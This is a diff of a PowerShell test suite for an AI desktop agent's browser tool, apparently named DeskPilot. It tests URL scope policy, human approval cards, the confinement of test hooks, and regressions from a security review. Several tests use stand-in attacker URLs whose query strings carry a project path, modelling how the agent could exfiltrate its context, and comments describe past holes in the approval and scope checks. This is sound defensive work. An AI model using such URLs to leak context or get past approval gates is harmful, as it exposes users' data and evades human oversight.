@@ -252,15 +252,21 @@ Describe 'Browser URL policy conformance' -Tag 'Unit' {
         $corpusPath = Join-Path $PSScriptRoot 'fixtures' 'browser-policy-corpus.json'
         $corpus = Get-Content -LiteralPath $corpusPath -Raw | ConvertFrom-Json
 
-        $script:UrlCases = @($corpus.urlCases | ForEach-Object {
-                @{ Url = $_.url; Expect = $_.expect; Note = $_.note }
-            })
-        $script:ResourceCases = @($corpus.resourceCases | ForEach-Object {
-                @{ Url = $_.url; Type = $_.type; Expect = $_.expect; Note = $_.note }
-            })
+        $script:UrlCases = @()
+        for ($i = 0; $i -lt @($corpus.urlCases).Count; $i++) {
+            $script:UrlCases += @{ Index = $i; Url = $corpus.urlCases[$i].url; Expect = $corpus.urlCases[$i].expect; Note = $corpus.urlCases[$i].note }
+        }
+        $script:ResourceCases = @()
+        for ($i = 0; $i -lt @($corpus.resourceCases).Count; $i++) {
+            $script:ResourceCases += @{ Index = $i; Url = $corpus.resourceCases[$i].url; Type = $corpus.resourceCases[$i].type; Expect = $corpus.resourceCases[$i].expect; Note = $corpus.resourceCases[$i].note }
+        }
         $script:FieldCases = @()
         for ($i = 0; $i -lt @($corpus.fieldCases).Count; $i++) {
             $script:FieldCases += @{ Index = $i; Expect = $corpus.fieldCases[$i].expect; Note = $corpus.fieldCases[$i].note }
+        }
+        $script:AddressCases = @()
+        for ($i = 0; $i -lt @($corpus.addressCases).Count; $i++) {
+            $script:AddressCases += @{ Index = $i; Address = $corpus.addressCases[$i].address; Expect = $corpus.addressCases[$i].expect; Note = $corpus.addressCases[$i].note }
         }
         $script:NodeAvailable = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
     }
@@ -277,18 +283,27 @@ Describe 'Browser URL policy conformance' -Tag 'Unit' {
         $node = Get-Command node -CommandType Application -ErrorAction SilentlyContinue
         if ($node) {
             $runner = Join-Path $PSScriptRoot 'fixtures' 'run-policy-corpus.mjs'
-            $stdout = & $node.Source $runner $corpusPath 2>&1
+            # UTF-8 on the round trip: the corpus deliberately contains hosts
+            # that only differ from an ASCII one after IDNA mapping, and the
+            # console code page would fold them into each other.
+            $previousEncoding = [Console]::OutputEncoding
+            try {
+                [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
+                $stdout = & $node.Source $runner $corpusPath 2>&1
+            }
+            finally { [Console]::OutputEncoding = $previousEncoding }
+
             if ($LASTEXITCODE -ne 0) {
                 $script:NodeError = ($stdout | Out-String).Trim()
             }
             else {
                 $parsed = ($stdout | Out-String) | ConvertFrom-Json
-                foreach ($row in $parsed.urlResults) { $script:NodeUrlVerdict[$row.url] = $row.actual }
-                foreach ($row in $parsed.resourceResults) {
-                    $script:NodeResourceVerdict["$($row.url)|$($row.type)"] = [bool]$row.actual
-                }
+                foreach ($row in $parsed.urlResults) { $script:NodeUrlVerdict[[int]$row.index] = $row.actual }
+                foreach ($row in $parsed.resourceResults) { $script:NodeResourceVerdict[[int]$row.index] = [bool]$row.actual }
                 $script:NodeFieldVerdict = @{}
                 foreach ($row in $parsed.fieldResults) { $script:NodeFieldVerdict[[int]$row.index] = [bool]$row.actual }
+                $script:NodeAddressVerdict = @{}
+                foreach ($row in $parsed.addressResults) { $script:NodeAddressVerdict[[int]$row.index] = [bool]$row.actual }
             }
         }
     }
@@ -317,24 +332,32 @@ Describe 'Browser URL policy conformance' -Tag 'Unit' {
         }
 
         It '<Expect>: <Note>' -TestCases $script:UrlCases {
-            param($Url, $Expect)
-            $script:NodeUrlVerdict.ContainsKey($Url) | Should -BeTrue -Because 'every corpus url must be classified'
-            $script:NodeUrlVerdict[$Url] | Should -Be $Expect
+            param($Index, $Expect)
+            $script:NodeUrlVerdict.ContainsKey([int]$Index) | Should -BeTrue -Because 'every corpus url must be classified'
+            $script:NodeUrlVerdict[[int]$Index] | Should -Be $Expect
         }
 
         It '<Type> -> <Expect>: <Note>' -TestCases $script:ResourceCases {
-            param($Url, $Type, $Expect)
-            $key = "$Url|$Type"
-            $script:NodeResourceVerdict.ContainsKey($key) | Should -BeTrue
-            $script:NodeResourceVerdict[$key] | Should -Be ([bool]$Expect)
+            param($Index, $Expect)
+            $script:NodeResourceVerdict.ContainsKey([int]$Index) | Should -BeTrue
+            $script:NodeResourceVerdict[[int]$Index] | Should -Be ([bool]$Expect)
         }
 
+        # The invariant policy.mjs states in its own header, which nothing
+        # asserted until a security review measured 26 disagreements against it.
         It 'is never more permissive than the PowerShell classifier' {
             $rank = @{ 'deny' = 0; 'ask' = 1; 'allow' = 2 }
             foreach ($case in $script:UrlCases) {
                 $mine = (Resolve-DpBrowserUrlDecision -Url $case.Url -Scope $script:CorpusScope).decision
-                $theirs = $script:NodeUrlVerdict[$case.Url]
+                $theirs = $script:NodeUrlVerdict[[int]$case.Index]
                 $rank[$theirs] | Should -BeLessOrEqual $rank[$mine] -Because "policy.mjs must not widen '$($case.Url)'"
+            }
+        }
+
+        It 'agrees with the PowerShell classifier on every corpus case' {
+            foreach ($case in $script:UrlCases) {
+                $mine = (Resolve-DpBrowserUrlDecision -Url $case.Url -Scope $script:CorpusScope).decision
+                $script:NodeUrlVerdict[[int]$case.Index] | Should -Be $mine -Because "the two enforcement points must agree on '$($case.Url)'"
             }
         }
     }
@@ -347,6 +370,17 @@ Describe 'Browser URL policy conformance' -Tag 'Unit' {
             param($Index, $Expect)
             $script:NodeFieldVerdict.ContainsKey([int]$Index) | Should -BeTrue
             $script:NodeFieldVerdict[[int]$Index] | Should -Be ([bool]$Expect)
+        }
+    }
+
+    # A public name can hold a private A record, and a pre-flight resolve is a
+    # TOCTOU against rebinding - so the peer address the connection landed on is
+    # what decides. Without this, a name was a way around the IP-literal refusal.
+    Context 'the internal-address refusal' -Skip:(-not $script:NodeAvailable) {
+        It '<Address> internal=<Expect>: <Note>' -TestCases $script:AddressCases {
+            param($Index, $Expect)
+            $script:NodeAddressVerdict.ContainsKey([int]$Index) | Should -BeTrue
+            $script:NodeAddressVerdict[[int]$Index] | Should -Be ([bool]$Expect)
         }
     }
 }
@@ -818,15 +852,23 @@ Describe 'Invoke-DpBrowserTool' -Tag 'Unit' {
             actions        = @()
             runtimeRoot    = 'C:\runtime'
             downloadRoot   = 'C:\runtime\downloads'
+            # The user's own words. Scope comes from here, never from the URL the
+            # Model chose - see Blocker B-1.
+            userUrl        = 'please read https://weathercity.com/ for the Osorno forecast'
         }
         $global:DeskPilotBrowserState = @{ session = $null; scope = @(); granted = @(); lastUrl = '' }
         $global:DeskPilotBrowserBridge = New-DpFakeBridge
         $global:DeskPilotBrowserTimeoutMinutes = 15
 
         Mock Start-DpBrowserSession {
-            @{ process = $null; faulted = $false; scope = @($Scope); events = [System.Collections.Generic.List[object]]::new() }
+            @{ process = $null; faulted = $false; scope = @($Scope); events = [System.Collections.Generic.List[object]]::new(); pageLinks = @() }
         }
-        Mock Invoke-DpBrowserRequest { @{ ok = $true; result = (New-DpFakePage) } }
+        # The scope command has to answer like the supervisor does, or the state
+        # under test is the mock's rather than the code's.
+        Mock Invoke-DpBrowserRequest {
+            if ($Command -eq 'scope') { return @{ ok = $true; result = [pscustomobject]@{ scope = @($Payload.hosts) } } }
+            @{ ok = $true; result = (New-DpFakePage) }
+        }
     }
 
     AfterEach {
@@ -836,15 +878,31 @@ Describe 'Invoke-DpBrowserTool' -Tag 'Unit' {
     }
 
     Context 'the workflow that was authorised' {
-        It 'opens the site the task named without asking anyone' {
+        It 'opens the site the user named without asking anyone' {
             $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
             $result.ok | Should -BeTrue
             $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
         }
 
-        It 'seeds the scope from that first address' {
+        It 'takes the scope from the user message, not from the address the model chose' {
             $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
             $global:DeskPilotBrowserState.scope | Should -Contain 'weathercity.com'
+        }
+
+        # The free hop: before B-1 was fixed, the first open of every Turn was
+        # allowed to any host on the internet with no card at all, which is a
+        # complete exfiltration channel for the Model's context.
+        It 'asks about a host the user never named, even as the first navigation' {
+            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot' | ConvertFrom-Json
+            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
+            $result.ok | Should -BeTrue -Because 'the fake bridge approves'
+        }
+
+        It 'asks nothing when the project already allows the host' {
+            $global:DeskPilotBrowserContext.userUrl = 'check the portal'
+            $global:DeskPilotBrowserContext.projectDomains = @('portal.test')
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://portal.test/'
+            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
         }
 
         It 'follows a link by its visible text' {
@@ -890,6 +948,28 @@ Describe 'Invoke-DpBrowserTool' -Tag 'Unit' {
             $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
             $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
             $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
+        }
+
+        # Same-origin egress: the Model composes the whole address, so a query
+        # string it invented on the user's own site is the same channel one hop
+        # shorter. Only an address the page itself offered runs silently.
+        It 'asks before opening a model-composed query on an in-scope host' {
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/x?leak=D%3A%5CGit%5CDeskPilot'
+            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
+        }
+
+        It 'does not ask for a plain in-scope path' {
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/cl/ll/osorno'
+            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
+        }
+
+        It 'does not ask for a link the page itself offered' {
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
+            $global:DeskPilotBrowserState.session.pageLinks = @('https://weathercity.com/s?q=osorno')
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/s?q=osorno'
+            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
         }
 
         It 'shows the whole address, including the part after the question mark' {
@@ -959,6 +1039,23 @@ Describe 'Invoke-DpBrowserTool' -Tag 'Unit' {
             $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
             $null = Invoke-DpBrowserTool -Action open -Url 'https://partner.test/page'
             $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
+        }
+
+        # The grant was previously pushed only when the scope count changed, and
+        # the count almost never changed - so the supervisor kept refusing the
+        # navigation the user had just approved.
+        It 'pushes the widened scope to the browser after a grant' {
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://granted.test/'
+            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter {
+                $Command -eq 'scope' -and (@($Payload.hosts) -contains 'granted.test')
+            } -Times 1 -Exactly
+        }
+
+        It 'keeps the original site in scope after a detour is approved' {
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
+            $null = Invoke-DpBrowserTool -Action open -Url 'https://granted.test/'
+            $global:DeskPilotBrowserState.scope | Should -Contain 'weathercity.com'
         }
     }
 
@@ -1253,6 +1350,436 @@ Describe 'Browser write capabilities' -Tag 'Unit' {
         }
     }
 }
+
+# A payload field the card does not render is a field nobody approved. The
+# browser cards shipped once with only the terminal's two fields wired up, so a
+# navigation asked the reader to "check the whole address" and then showed no
+# address at all. These are the guards against that returning.
+Describe 'Approval card renders what is being approved' -Tag 'Unit' {
+    BeforeAll {
+        $webRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'web' | Convert-Path
+        $script:AppJs = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'app.js') -Raw
+        $script:LocaleFiles = @{
+            en = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'locales' 'en.js') -Raw
+            de = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'locales' 'de.js') -Raw
+        }
+
+        # Derived from the function rather than hard-coded, so adding a summary
+        # field to the API fails this test until the card shows it.
+        $script:SummaryKeys = @((New-DpApprovalRequest -Tool 'browser_page' -Class 'BrowserAction' `
+                    -Argument @{ action = 'fill_form'; url = 'https://x.test/'; host = 'x.test'; control = 'Save'; filePath = 'C:\p\a.txt'; fields = @(@{ name = 'a'; value = 'b' }) } `
+                    -ConversationId 'c-1' -TurnId 't-1').summary.Keys)
+    }
+
+    It 'reads every field the approval request carries' -TestCases @(
+        @{ Key = 'command' }, @{ Key = 'workingDirectory' }, @{ Key = 'url' }
+        @{ Key = 'action' }, @{ Key = 'control' }, @{ Key = 'filePath' }, @{ Key = 'fields' }
+    ) {
+        param($Key)
+        $script:SummaryKeys | Should -Contain $Key -Because 'the request must still carry it'
+        $script:AppJs | Should -Match ([regex]::Escape("summary.$Key"))
+    }
+
+    It 'leaves no summary field unrendered' {
+        # 'project' is shown by the surrounding conversation, not the card.
+        foreach ($key in $script:SummaryKeys) {
+            if ($key -eq 'project') { continue }
+            $script:AppJs | Should -Match ([regex]::Escape("summary.$key")) -Because "the card must show summary.$key"
+        }
+    }
+
+    It 'gives a browser approval its own title rather than the terminal one' -TestCases @(
+        @{ Key = 'approval.title.navigation' }, @{ Key = 'approval.title.fill' }
+        @{ Key = 'approval.title.press' }, @{ Key = 'approval.title.upload' }
+        @{ Key = 'approval.title.download' }
+    ) {
+        param($Key)
+        $script:AppJs | Should -Match ([regex]::Escape($Key))
+        foreach ($locale in $script:LocaleFiles.Keys) {
+            $script:LocaleFiles[$locale] | Should -Match ([regex]::Escape("'$Key'")) -Because "$locale must translate it"
+        }
+    }
+
+    It 'has both locales for every approval string the card uses' {
+        $used = @([regex]::Matches($script:AppJs, "t\('(approval\.[A-Za-z.]+)'\)") | ForEach-Object { $_.Groups[1].Value } | Select-Object -Unique)
+        $used.Count | Should -BeGreaterThan 5
+        foreach ($key in $used) {
+            foreach ($locale in $script:LocaleFiles.Keys) {
+                $script:LocaleFiles[$locale] | Should -Match ([regex]::Escape("'$key'")) -Because "$locale is missing $key"
+            }
+        }
+    }
+
+    It 'never builds the card as markup' {
+        # Every value on the card is model-authored or page-influenced.
+        $start = $script:AppJs.IndexOf('function approvalRow(')
+        $end = $script:AppJs.IndexOf('function renderApproval(')
+        $start | Should -BeGreaterThan 0
+        $section = $script:AppJs.Substring($start, ($script:AppJs.IndexOf('scrollThread();', $end) - $start))
+        $section | Should -Not -Match 'innerHTML'
+        $section | Should -Not -Match 'insertAdjacentHTML'
+    }
+
+    It 'says so rather than rendering blank when it cannot describe the action' {
+        $script:AppJs | Should -Match 'approval\.noDetail'
+        foreach ($locale in $script:LocaleFiles.Keys) {
+            $script:LocaleFiles[$locale] | Should -Match "'approval\.noDetail'"
+        }
+    }
+
+    It 'does not offer Run it for an action that runs nothing' {
+        $script:AppJs | Should -Match "approval\.allow"
+        $script:AppJs | Should -Match "kind === 'Terminal' \? 'approval\.approve' : 'approval\.allow'"
+    }
+}
+
+Describe 'Project browser settings' -Tag 'Unit' {
+    BeforeAll {
+        $webRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'web' | Convert-Path
+        $script:SettingsJs = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'app.js') -Raw
+    }
+
+    It 'offers every capability the API accepts' -TestCases @(
+        @{ Capability = 'fill' }, @{ Capability = 'submit' }
+        @{ Capability = 'upload' }, @{ Capability = 'download' }
+    ) {
+        param($Capability)
+        $script:SettingsJs | Should -Match ([regex]::Escape("key: '$Capability'"))
+    }
+
+    It 'offers nothing the API would reject' {
+        $offered = @([regex]::Matches($script:SettingsJs, "key: '(fill|submit|upload|download|[a-z_]+)',\s*\r?\n\s*label:") |
+                ForEach-Object { $_.Groups[1].Value })
+        $offered.Count | Should -Be 4
+        foreach ($capability in $offered) {
+            { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserActions = @($capability) } } | Should -Not -Throw
+        }
+    }
+
+    # Granting a write capability is a considered edit, not a reflex. The
+    # approval card deliberately has no such button.
+    It 'confirms before granting a write capability' {
+        ([regex]::Matches($script:SettingsJs, 'confirm:')).Count | Should -BeGreaterOrEqual 4
+        $script:SettingsJs | Should -Match 'box\.checked && !window\.confirm\(capability\.confirm\)'
+    }
+
+    It 'warns that a press cannot be undone' {
+        $script:SettingsJs | Should -Match 'send, buy, change or delete'
+    }
+
+    It 'states that credential boxes are never filled' {
+        $script:SettingsJs | Should -Match 'never type into a password'
+    }
+
+    It 'lets the project carry extra sites' {
+        $script:SettingsJs | Should -Match 'browserDomains'
+        $script:SettingsJs | Should -Match 'project-browser-sites'
+    }
+
+    It 'sends the whole project list rather than a partial patch' {
+        # Merge-DpSettings replaces projects wholesale, so a partial row would
+        # silently drop the other fields on that project.
+        $script:SettingsJs | Should -Match 'browserActions: box\.checked \? without\.concat\(capability\.key\) : without'
+    }
+}
+
+Describe 'Browser runtime lifecycle' -Tag 'Unit' {
+    BeforeAll {
+        $script:LifeRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-life-" + [guid]::NewGuid().ToString('N'))
+        New-Item -ItemType Directory -Path (Join-Path $script:LifeRoot 'browsers' 'chromium-1200') -Force | Out-Null
+        $script:BrowserExe = Join-Path $script:LifeRoot 'browsers' 'chromium-1200' 'chrome.exe'
+    }
+
+    AfterAll {
+        if (Test-Path -LiteralPath $script:LifeRoot) {
+            Remove-Item -LiteralPath $script:LifeRoot -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    Context 'finding leftover browsers' {
+        # The discriminator is the executable path, never the process name.
+        # Matching on "chrome" would sweep up the user's own browser, which is
+        # the single worst thing this could do.
+        It 'finds a process running from the DeskPilot runtime' {
+            Mock Get-DpProcessSnapshot { @(@{ id = 4242; name = 'chrome'; path = $script:BrowserExe; started = (Get-Date) }) }
+            # Wrapped, like every caller: a single-element return unrolls, and
+            # .Count on a bare hashtable is its key count rather than one.
+            $orphans = @(Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot)
+            $orphans.Count | Should -Be 1
+            $orphans[0].id | Should -Be 4242
+        }
+
+        It 'reports an empty result as empty rather than as one phantom entry' {
+            # ', $array.ToArray()' on an empty list yields a one-element array
+            # wrapping an empty array, so @() at the call site counts a phantom.
+            # That made the hostile-site proof report an orphan that did not exist.
+            Mock Get-DpProcessSnapshot { @() }
+            @(Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot).Count | Should -Be 0
+            @(Get-DpBrowserScope -StartUrl 'file:///C:/secret').Count | Should -Be 0
+        }
+
+        It 'leaves the user own browser alone' -TestCases @(
+            @{ Path = 'C:\Program Files\Google\Chrome\Application\chrome.exe' }
+            @{ Path = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' }
+            @{ Path = '/usr/bin/chromium' }
+        ) {
+            param($Path)
+            Mock Get-DpProcessSnapshot { @(@{ id = 99; name = 'chrome'; path = $Path; started = (Get-Date) }) }
+            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
+        }
+
+        It 'ignores a process whose path it cannot read' {
+            Mock Get-DpProcessSnapshot { @(@{ id = 7; name = 'chrome'; path = ''; started = $null }) }
+            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
+        }
+
+        It 'is not fooled by a path that merely starts with the same letters' {
+            Mock Get-DpProcessSnapshot {
+                @(@{ id = 8; name = 'chrome'; path = ($script:LifeRoot + '-evil\browsers\chromium-1200\chrome.exe'); started = $null })
+            }
+            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
+        }
+
+        It 'reports nothing when nothing is running' {
+            Mock Get-DpProcessSnapshot { @() }
+            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
+        }
+    }
+
+    Context 'removing the runtime' {
+        It 'reports an install that was never there rather than failing' {
+            $absent = Join-Path $script:LifeRoot 'never-installed'
+            $result = Uninstall-DpBrowserRuntime -RuntimeRoot $absent -Confirm:$false
+            $result.alreadyAbsent | Should -BeTrue
+            $result.error | Should -BeNullOrEmpty
+        }
+
+        It 'deletes the runtime folder' {
+            Mock Get-DpProcessSnapshot { @() }
+            $doomed = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-doomed-" + [guid]::NewGuid().ToString('N'))
+            New-Item -ItemType Directory -Path (Join-Path $doomed 'node_modules') -Force | Out-Null
+
+            $result = Uninstall-DpBrowserRuntime -RuntimeRoot $doomed -Confirm:$false
+            $result.removed | Should -BeTrue
+            Test-Path -LiteralPath $doomed | Should -BeFalse
+        }
+
+        # Deleting the folder under a running browser leaves a half-removed
+        # install that reports as broken rather than absent, which is worse:
+        # it offers repair for something the user asked to be rid of.
+        It 'closes leftover processes before deleting' {
+            $doomed = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-doomed-" + [guid]::NewGuid().ToString('N'))
+            New-Item -ItemType Directory -Path $doomed -Force | Out-Null
+            Mock Get-DpProcessSnapshot { @() }
+            Mock Remove-DpBrowserOrphan { @{ found = 0; closed = 0; failed = @() } }
+
+            $null = Uninstall-DpBrowserRuntime -RuntimeRoot $doomed -Confirm:$false
+            Should -Invoke Remove-DpBrowserOrphan -Times 1 -Exactly
+        }
+
+        It 'never touches Node, which DeskPilot did not install' {
+            $source = Get-Command Uninstall-DpBrowserRuntime | ForEach-Object { $_.Definition }
+            $source | Should -Not -Match 'nodejs|node\.exe'
+        }
+    }
+
+    # The supervisor carries two environment-gated hooks so the hostile-site
+    # harness can serve a real https origin on a real hostname. They exist
+    # because weakening the policy to make testing convenient would test the
+    # wrong thing - but a hook nothing checks is a hook that eventually ships on.
+    Context 'the test hooks are unreachable from the product' {
+        BeforeAll {
+            $script:PrivateRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'Private' | Convert-Path
+            $script:PublicRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'Public' | Convert-Path
+            $script:WebRootForHooks = Join-Path $PSScriptRoot '..' '..' 'source' 'web' | Convert-Path
+        }
+
+        It 'no production code assigns <Hook>' -TestCases @(
+            @{ Hook = 'DESKPILOT_BROWSER_TEST_ARGS' }
+            @{ Hook = 'DESKPILOT_BROWSER_TEST_INSECURE' }
+        ) {
+            param($Hook)
+            # Forwarding one that already exists in the environment is fine - a
+            # page and a model can reach neither. Assigning one would mean
+            # DeskPilot could switch off its own certificate checking.
+            $hits = @(Get-ChildItem -Path $script:PrivateRoot, $script:PublicRoot, $script:WebRootForHooks -Recurse -File |
+                    Select-String -Pattern "\`$env:$Hook\s*=|Environment\['$Hook'\]\s*=")
+            $hits | Should -BeNullOrEmpty -Because 'only the environment DeskPilot was started in may set it'
+        }
+
+        It 'forwards the hooks by prefix rather than naming them in the product' {
+            $source = Get-Command Start-DpBrowserSession | ForEach-Object { $_.Definition }
+            $source | Should -Match "DESKPILOT_BROWSER_TEST_\*"
+            $source | Should -Not -Match 'DESKPILOT_BROWSER_TEST_INSECURE'
+        }
+
+        It 'reports an active hook rather than running quietly' {
+            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
+            $supervisor | Should -Match 'testHooks:'
+            (Get-Command Start-DpBrowserSession | ForEach-Object { $_.Definition }) | Should -Match 'Write-Warning'
+        }
+
+        It 'the supervisor reads them from the environment only' {
+            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
+            $supervisor | Should -Match 'process\.env\.DESKPILOT_BROWSER_TEST_ARGS'
+            $supervisor | Should -Match 'process\.env\.DESKPILOT_BROWSER_TEST_INSECURE'
+            # Never from a protocol command, which is the one channel the model
+            # can influence.
+            $supervisor | Should -Not -Match 'ignoreHTTPSErrors:\s*[a-z]*insecure[a-z]*\s*\?\?'
+            $supervisor | Should -Match 'ignoreHTTPSErrors: testInsecure'
+        }
+
+        It 'certificate errors are honoured unless a hook is set' {
+            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
+            $supervisor | Should -Match "DESKPILOT_BROWSER_TEST_INSECURE === '1'"
+        }
+    }
+}
+
+# Every finding from the agentic security review of 2026-09-05. A fix without a
+# test is the same shape of claim the review was called to check.
+Describe 'Security review regressions' -Tag 'Unit' {
+    Context 'B-3 - Stop and the end of a Turn close the browser' {
+        It 'the Turn closes the browser in its finally, not on the next Turn' {
+            $source = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'Private' 'Invoke-DpTurn.ps1') -Raw
+            $finally = $source.Substring($source.LastIndexOf('finally {'))
+            $finally | Should -Match 'Close-DpBrowserSession'
+        }
+
+        It 'the stop route closes the browser rather than only cancelling bridges' {
+            $source = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'Private' 'Invoke-DpRouteHandler.ps1') -Raw
+            $stop = [regex]::Match($source, "'stopTurn' \{.*?\n        \}", 'Singleline').Value
+            $stop | Should -Match 'Close-DpBrowserSession'
+        }
+    }
+
+    Context 'B-4 - the asset-root hook carries the tested prefix' {
+        It 'the override is named under DESKPILOT_BROWSER_TEST_' {
+            $source = Get-Command Get-DpBrowserAssetRoot | ForEach-Object { $_.Definition }
+            $source | Should -Match 'DESKPILOT_BROWSER_TEST_ROOT'
+            # The un-prefixed name replaced policy.mjs and supervisor.mjs with
+            # arbitrary Node code, with no guard test and no warning.
+            $source | Should -Not -Match 'DESKPILOT_BROWSER_ROOT\b'
+        }
+
+        It 'an active override is reported by the runtime' {
+            $previous = [System.Environment]::GetEnvironmentVariable('DESKPILOT_BROWSER_TEST_ROOT')
+            try {
+                $env:DESKPILOT_BROWSER_TEST_ROOT = $PSScriptRoot
+                $runtime = Get-DpBrowserRuntime -RuntimeRoot (Join-Path ([System.IO.Path]::GetTempPath()) 'nope') -PinnedVersion '1.63.0'
+                $runtime.testHooks | Should -Contain 'DESKPILOT_BROWSER_TEST_ROOT'
+                ($runtime.issues -join ' ') | Should -Match 'test hooks'
+            }
+            finally {
+                if ($null -eq $previous) { Remove-Item Env:DESKPILOT_BROWSER_TEST_ROOT -ErrorAction SilentlyContinue }
+                else { $env:DESKPILOT_BROWSER_TEST_ROOT = $previous }
+            }
+        }
+
+        It 'reports no hooks when none are set' {
+            (Get-DpBrowserRuntime -RuntimeRoot (Join-Path ([System.IO.Path]::GetTempPath()) 'nope') -PinnedVersion '1.63.0').testHooks |
+                Should -BeNullOrEmpty
+        }
+    }
+
+    Context 'M-2 - the protocol carries the value that was approved' {
+        BeforeAll {
+            $script:EncodingRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-enc-" + [guid]::NewGuid().ToString('N'))
+            New-Item -ItemType Directory -Path $script:EncodingRoot -Force | Out-Null
+            $script:EncodingNode = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
+        }
+
+        AfterAll {
+            if (Test-Path -LiteralPath $script:EncodingRoot) {
+                Remove-Item -LiteralPath $script:EncodingRoot -Recurse -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+        # Without UTF-8 on the pipes, .NET falls back to the console code page:
+        # the card shows 'Straße', the fingerprint binds 'Straße', and the
+        # supervisor types 'Stra?e'. The action performed is not the one approved.
+        It 'round-trips <Value> unchanged' -Skip:(-not $script:EncodingNode) -TestCases @(
+            @{ Value = 'Stra' + [char]0x00DF + 'e' }
+            @{ Value = 'Gr' + [char]0x00FC + [char]0x00DF + 'e' }
+            @{ Value = 'Osorno, Chile - 12' + [char]0x00B0 + 'C' }
+            @{ Value = [char]0x65E5 + [char]0x672C + [char]0x8A9E }
+            @{ Value = 'caf' + [char]0x00E9 + ' na' + [char]0x00EF + 've' }
+        ) {
+            param($Value)
+            $session = Start-DpBrowserSession -Scope @('example.test') -RuntimeRoot $script:EncodingRoot `
+                -SupervisorPath (Join-Path $PSScriptRoot 'fixtures' 'fake-supervisor.mjs') -StartTimeoutSeconds 30
+            try {
+                $response = Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = $Value } -TimeoutSeconds 20
+                $response.ok | Should -BeTrue
+                $response.result.echoed | Should -Be $Value
+            }
+            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
+        }
+
+        It 'sets UTF-8 on both pipes rather than inheriting the console code page' {
+            $source = Get-Command Start-DpBrowserSession | ForEach-Object { $_.Definition }
+            $source | Should -Match 'StandardInputEncoding'
+            $source | Should -Match 'StandardOutputEncoding'
+        }
+    }
+
+    Context 'M-5 and M-4 - declared bounds are enforced, not decorative' {
+        BeforeAll {
+            $script:Supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
+        }
+
+        It 'the download cap is read, not merely declared' {
+            # It existed only as a constant: an approved 40 GB download filled
+            # the disk while the comment claimed every bound was a refusal.
+            ([regex]::Matches($script:Supervisor, 'downloadBytes')).Count | Should -BeGreaterThan 1
+            $script:Supervisor | Should -Match 'rmSync\(target'
+        }
+
+        It 'bounds page-controlled href and title' {
+            $script:Supervisor | Should -Match 'hrefChars'
+            $script:Supervisor | Should -Match 'titleChars'
+        }
+
+        It 'bounds the emitted refusals, not only the array' {
+            $script:Supervisor | Should -Match 'if \(state\.blocked\.length >= 200\) return;'
+        }
+    }
+
+    Context 'M-7 - a write is bound to the page it was approved on' {
+        It 'the supervisor refuses a page that moved' {
+            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
